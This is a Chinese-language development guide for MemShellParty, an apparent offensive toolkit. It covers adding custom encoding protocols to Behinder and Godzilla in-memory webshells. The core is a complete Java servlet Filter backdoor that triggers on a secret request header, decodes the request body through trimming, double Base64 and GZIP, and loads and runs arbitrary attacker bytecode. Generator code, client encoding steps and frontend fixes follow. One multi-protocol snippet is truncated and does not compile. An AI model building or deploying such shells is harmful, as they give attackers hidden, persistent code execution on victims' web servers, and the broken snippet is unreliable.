# 添加自定义通信协议内存马

本文档记录如何在 MemShellParty 中为现有的内存马工具（如 Behinder、Godzilla 等）添加自定义通信协议支持。

## 背景

默认情况下，Behinder 使用 AES 加密通信，Godzilla 使用多种加密器。但在某些场景下，我们需要使用自定义的通信协议，例如：

- 冰蝎自定义协议：GZIP 压缩 + 双重 Base64 编码 + 字符替换
- 哥斯拉自定义协议：XOR + Base64 + 特殊头部标记
- 其他自定义加密/编码流程

## 实践案例：为 Behinder 添加 Gzip+Base64 自定义协议

### 需求说明

服务端 JSP 脚本解密流程：
```
1. 跳过前 10 字节和后 12 字节
2. Base64 解码 → 字符串替换（<→+, >→/）→ 再次 Base64 解码
3. GZIP 解压得到原始字节码
```

#### 2. 创建自定义协议的模板类

根据内存马类型创建对应的模板类，实现自定义解密逻辑：

**Filter 类型：`BehinderCustomFilter.java`**

```java
package com.reajason.javaweb.memshell.shelltool.behinder;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Field;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;

public class BehinderCustomFilter extends ClassLoader implements Filter {
    public static String headerName;
    public static String headerValue;

    public BehinderCustomFilter() {}

    public BehinderCustomFilter(ClassLoader c) {
        super(c);
    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, 
                         FilterChain filterChain) throws IOException, ServletException {
        HttpServletRequest request = (HttpServletRequest) servletRequest;
        HttpServletResponse response = (HttpServletResponse) servletResponse;

        try {
            if (request.getHeader(this.headerName) != null
                    && request.getHeader(this.headerName).contains(this.headerValue)) {
                HttpSession session = request.getSession();
                Map<String, Object> obj = new HashMap<>(3);
                obj.put("request", servletRequest);
                obj.put("response", unwrap(response));
                obj.put("session", session);
                session.setAttribute("u", this.headerValue);

                // 读取请求体数据
                ByteArrayOutputStream bos = new ByteArrayOutputStream();
                byte[] buf = new byte[512];
                int length = request.getInputStream().read(buf);
                while (length > 0) {
                    bos.write(buf, 0, length);
                    length = request.getInputStream().read(buf);
                }
                byte[] data = bos.toByteArray();

                // 自定义解密逻辑
                byte[] decrypted = decrypt(data);
                
                // 动态加载并执行
                Object instance = new BehinderCustomFilter(
                    Thread.currentThread().getContextClassLoader()
                ).defineClass(decrypted, 0, decrypted.length).newInstance();
                instance.equals(obj);
                return;
            }
        } catch (Throwable e) {
            e.printStackTrace();
        }
        filterChain.doFilter(servletRequest, servletResponse);
    }

    // 核心解密方法 - 根据自定义协议实现
    private byte[] decrypt(byte[] data) throws Exception {
        // 1. 跳过前 10 字节和后 12 字节
        byte[] trimmedData = Arrays.copyOfRange(data, 10, data.length - 12);
        
        // 2. 第一次 Base64 解码
        String base64Str1 = new String(trimmedData);
        byte[] decoded1 = base64Decode(base64Str1);
        
        // 3. 字符替换
        String replaced = new String(decoded1).replace("<", "+").replace(">", "/");
        
        // 4. 第二次 Base64 解码
        byte[] decoded2 = base64Decode(replaced);
        
        // 5. GZIP 解压
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        java.io.ByteArrayInputStream in = new java.io.ByteArrayInputStream(decoded2);
        java.util.zip.GZIPInputStream ungzip = new java.util.zip.GZIPInputStream(in);
        byte[] buffer = new byte[256];
        int n;
        while ((n = ungzip.read(buffer)) >= 0) {
            out.write(buffer, 0, n);
        }
        return out.toByteArray();
    }

    // 工具方法
    public Object unwrap(Object obj) {
        try {
            return getFieldValue(obj, "response");
        } catch (Throwable e) {
            return obj;
        }
    }

    public static Object getFieldValue(Object obj, String name) throws Exception {
        Class<?> clazz = obj.getClass();
        while (clazz != Object.class) {
            try {
                Field field = clazz.getDeclaredField(name);
                field.setAccessible(true);
                return field.get(obj);
            } catch (NoSuchFieldException var5) {
                clazz = clazz.getSuperclass();
            }
        }
        throw new NoSuchFieldException(obj.getClass().getName() + " Field not found: " + name);
    }

    public static byte[] base64Decode(String bs) throws Exception {
        try {
            Object decoder = Class.forName("java.util.Base64").getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
        } catch (Exception var6) {
            Object decoder = Class.forName("sun.misc.BASE64Decoder").newInstance();
            return (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
        }
    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {}

    @Override
    public void destroy() {}
}
```

**Servlet 类型：`BehinderCustomServlet.java`**

结构与 Filter 类似，主要区别：
- 实现 `Servlet` 接口而非 `Filter`
- `service` 方法替代 `doFilter` 方法

**Listener 类型：`BehinderCustomListener.java`**

结构类似，需要注意：
- 实现 `ServletContextListener` 接口
- `getResponseFromRequest` 方法使用空实现（框架会自动填充）

#### 3. 修改生成器 (Generator)

修改 `BehinderGenerator.java`，根据协议字段选择不同模板：

```java
package com.reajason.javaweb.memshell.generator;

import com.reajason.javaweb.memshell.config.BehinderConfig;
import com.reajason.javaweb.memshell.config.ShellConfig;
import com.reajason.javaweb.memshell.shelltool.behinder.*;
import net.bytebuddy.ByteBuddy;
import net.bytebuddy.dynamic.DynamicType;
import org.apache.commons.codec.digest.DigestUtils;

import static net.bytebuddy.matcher.ElementMatchers.named;

public class BehinderGenerator extends ByteBuddyShellGenerator<BehinderConfig> {
    public BehinderGenerator(ShellConfig shellConfig, BehinderConfig shellToolConfig) {
        super(shellConfig, shellToolConfig);
    }

    @Override
    public DynamicType.Builder<?> getBuilder() {
        // 根据协议字段选择不同模板
        if ("custom".equalsIgnoreCase(shellToolConfig.getProtocol())) {
            Class<?> customShellClass = getCustomShellClass();
            return new ByteBuddy()
                    .redefine(customShellClass)
                    .field(named("headerName")).value(shellToolConfig.getHeaderName())
                    .field(named("headerValue")).value(shellToolConfig.getHeaderValue());
        } else {
            // 默认 AES 协议
            String md5Key = DigestUtils.md5Hex(shellToolConfig.getPass()).substring(0, 16);
            return new ByteBuddy()
                    .redefine(shellToolConfig.getShellClass())
                    .field(named("pass")).value(md5Key)
                    .field(named("headerName")).value(shellToolConfig.getHeaderName())
                    .field(named("headerValue")).value(shellToolConfig.getHeaderValue());
        }
    }

    private Class<?> getCustomShellClass() {
        String shellType = shellConfig.getShellType();
        if (shellType.contains("Filter")) {
            return BehinderCustomFilter.class;
        } else if (shellType.contains("Servlet")) {
            return BehinderCustomServlet.class;
        } else if (shellType.contains("Listener")) {
            return BehinderCustomListener.class;
        }
        return BehinderCustomFilter.class; // 默认
    }
}
```

### 添加全新协议类型

#### 协议命名规范

使用小写 + 下划线格式：
- `aes` - 默认 AES 加密
- `custom` - 自定义协议
- `xor_base64` - XOR + Base64
- `gzip_base64` - GZIP + Base64
- `rc4_base64` - RC4 + Base64

#### 多协议支持

可以在一个工具中支持多个协议：

```java
public class BehinderGenerator extends ByteBuddyShellGenerator<BehinderConfig> {
    @Override
    public DynamicType.Builder<?> getBuilder() {
        return switch (shellToolConfig.getProtocol().toLowerCase()) {
            case "aes" -> buildAesProtocol();
            case "custom" -> buildCustomProtocol();
            case "xor" -> buildXorProtocol();
            case "rc4" -> buildRc4Protocol();
            default -> buildAesProtocol();
        };
    }
    
    private DynamicType.Builder<?> buildAesProtocol() {
        String md5Key = DigestUtils.md5Hex(shellToolConfig.getPass()).substring(0, 16);

    private DynamicType.Builder<?> buildCustomProtocol() {
        return new ByteBuddy()
                .redefine(BehinderCustomFilter.class)
                .field(named("headerName")).value(shellToolConfig.getHeaderName());
    }
    
    // ... 其他协议实现
```

## 注意事项

### 1. 字节码兼容性

- 使用反射调用 JDK 类（如 `Base64`），避免 JDK 版本兼容问题
- 对于 JDK 9+，启用 `byPassJavaModule` 选项

```java
public static byte[] base64Decode(String bs) throws Exception {
    try {
        // JDK 8+
        Object decoder = Class.forName("java.util.Base64")
            .getMethod("getDecoder").invoke(null);
        return (byte[]) decoder.getClass()
            .getMethod("decode", String.class).invoke(decoder, bs);
    } catch (Exception var6) {
        // JDK 6/7 fallback
        Object decoder = Class.forName("sun.misc.BASE64Decoder").newInstance();
        return (byte[]) decoder.getClass()
            .getMethod("decodeBuffer", String.class).invoke(decoder, bs);
    }
}
```

### 2. 类加载器

使用 `Thread.currentThread().getContextClassLoader()` 确保在模块隔离环境下能正常加载类：

```java
Object instance = new CustomShell(
    Thread.currentThread().getContextClassLoader()
).defineClass(decrypted, 0, decrypted.length).newInstance();
```

### 3. 请求头配置

- `headerName`：用于识别恶意请求的请求头名称
- `headerValue`：请求头的特征值

确保客户端和服务端使用相同的配置。

## 踩坑记录（重要！）

以下是实际开发中遇到的真实问题，请务必检查每一项：

### 坑 1：前端表单数据未序列化

**症状**：后端收不到 `behinderProtocol` 字段

**原因**：`transformer.ts` 中忘记添加字段序列化

**错误示例**：
```typescript
// ❌ 错误：缺少 behinderProtocol
const shellToolConfig: ShellToolConfig = {
  behinderPass: formValue.behinderPass,
  headerName: formValue.headerName,
  // 缺少 behinderProtocol
};
```

**正确示例**：
```typescript
// ✅ 正确：添加所有字段
const shellToolConfig: ShellToolConfig = {
  behinderPass: formValue.behinderPass,
  behinderProtocol: formValue.behinderProtocol,  // ✅ 必须有
  headerName: formValue.headerName,
};
```

**检查位置**：`web/app/utils/transformer.ts`

---

### 坑 2：表单默认值缺失

**症状**：请求中有 `behinderProtocol` 但值为 `undefined` 或被忽略

**原因**：react-hook-form 要求所有字段必须在 `defaultValues` 中初始化

**错误示例**：
```typescript
// ❌ 错误：缺少 behinderProtocol
const defaultValues: MemShellFormSchema = {
  server: "Tomcat",
  behinderPass: "",
  // 缺少 behinderProtocol
};
```

**正确示例**：
```typescript
// ✅ 正确：设置默认值
const defaultValues: MemShellFormSchema = {
  server: "Tomcat",
  behinderPass: "",
  behinderProtocol: "aes",  // ✅ 设置默认值
};
```

**检查位置**：`web/app/routes/memshell.tsx`

**原理**：react-hook-form 不会注册未在 `defaultValues` 中定义的字段，导致值为 `undefined`，JSON 序列化时被忽略。

---

### 坑 3：RadioGroup 组件值绑定错误

**症状**：选择协议后请求中的值为 `"on"` 而不是 `"custom"`

**原因**：Base UI 的 RadioGroup 组件不能直接 spread `{...field}`

**错误示例**：
```tsx
// ❌ 错误：直接 spread field
<RadioGroup {...field} className="flex items-center gap-4">
  <RadioGroupItem value="aes" id="aes" />
  <RadioGroupItem value="custom" id="custom" />
</RadioGroup>
```

**正确示例**：
```tsx
// ✅ 正确：显式绑定 value 和 onChange
<RadioGroup
  onValueChange={field.onChange}
  value={field.value}
  className="flex items-center gap-4"
>
  <RadioGroupItem value="aes" id="aes" />
  <RadioGroupItem value="custom" id="custom" />
</RadioGroup>
```

**检查位置**：`web/app/components/memshell/tabs/behinder-tab.tsx`

**原理**：RadioGroup 的 `onChange` 返回值是字符串值，而不是 React 事件对象，需要显式绑定。

---

### 坑 4：Listener 模板方法返回类型错误

**症状**：生成 Listener 时报错 `Cannot assign class java.lang.Object to interface javax.servlet.http.HttpServletResponse`

**原因**：Listener 的 `getResponseFromRequest` 方法返回类型必须是 `Object`，不能是具体类

**错误示例**：
```java
// ❌ 错误：返回具体类型
public HttpServletResponse getResponseFromRequest(Object request) throws Exception {
    return null;
}
```

**正确示例**：
```java
// ✅ 正确：返回 Object
public Object getResponseFromRequest(Object request) throws Exception {
    return null;
}
```

**检查位置**：`BehinderCustomListener.java`、`GodzillaCustomListener.java` 等

**原理**：框架会在运行时动态实现该方法，返回具体类型会导致类型转换失败。

---

### 坑 5：浏览器缓存导致前端未更新

**症状**：修改了前端代码但请求体仍然缺少字段

**原因**：浏览器缓存了旧的 JS 文件

**解决方案**：
1. **强制刷新**：`Ctrl+Shift+R`（Windows）或 `Cmd+Shift+R`（Mac）
2. **清除缓存**：`Ctrl+Shift+Delete` → 清除"缓存的图片和文件"
3. **开发模式禁用缓存**：F12 → Network 标签 → 勾选 "Disable cache"
4. **清除 Service Worker**：
   ```javascript
   navigator.serviceWorker.getRegistrations().then(regs => {
     regs.forEach(reg => reg.unregister());
     location.reload(true);
   });
   ```

**验证方法**：
1. F12 → Sources → 找到 `memshell-*.js`
2. 搜索字段名（如 `behinderProtocol`）
3. 确认代码已更新

## 常见问题

### Q: 如何调试自定义协议？

A: 开启调试模式（`debug: true`），内存马会打印异常堆栈信息到业务日志。

### Q: 客户端加密流程如何实现？

A: 需要与服务端解密流程相反。例如服务端：`GZIP → Base64 → 替换 → Base64 → 添加头尾`
客户端应该是：`原始数据 → GZIP → Base64 → 替换 → Base64 → 添加 10 字节头 + 12 字节尾`

### Q: 支持多少种协议？

A: 理论上无限制，只需在 Generator 中添加对应的 `case` 分支和模板类。

### Q: 如何为 Godzilla 添加新协议？

A: 参考本文档的 Behinder 实现，复制模式到 Godzilla 相关文件即可。
